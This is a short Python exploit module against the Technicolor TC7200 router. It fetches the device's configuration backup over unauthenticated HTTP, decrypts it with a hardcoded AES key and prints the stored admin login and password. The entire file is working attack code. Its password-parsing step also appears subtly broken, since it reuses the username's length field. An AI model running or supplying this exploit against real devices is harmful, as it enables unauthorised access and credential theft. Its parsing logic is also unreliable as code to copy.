# rsf exploit module
# description: Technicolor TC7200 Password Disclosure V2 using AES decryption on config backup.

import requests
import binascii
import struct
from Crypto.Cipher import AES

def decrypt_backup(backup):
    key = binascii.unhexlify('000102030405060708090A0B0C0D0E0F101112131415161718191A1B1C1D1E1F')
    length = (len(backup) // 16) * 16
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(backup[:length])

def parse_backup(plain):
    p = plain.find(b'MLog')
    if p > 0:
        p += 6
        nh = struct.unpack('!H', plain[p:p+2])[0]
        name = plain[p+2:p+2+nh]
        p += 2 + nh
        pwd = plain[p+2:p+2+nh]
        return name.decode(), pwd.decode()
    return '', ''

def exploit(target, port):
    url = f"http://{target}:{port}/goform/system/GatewaySettings.bin"
    response = requests.get(url)
    if response.status_code == 200:
        plain = decrypt_backup(response.content)
        name, pwd = parse_backup(plain)
        print(f"[+] login: {name}, password: {pwd}")
    else:
        print("[-] Failed to fetch config.")

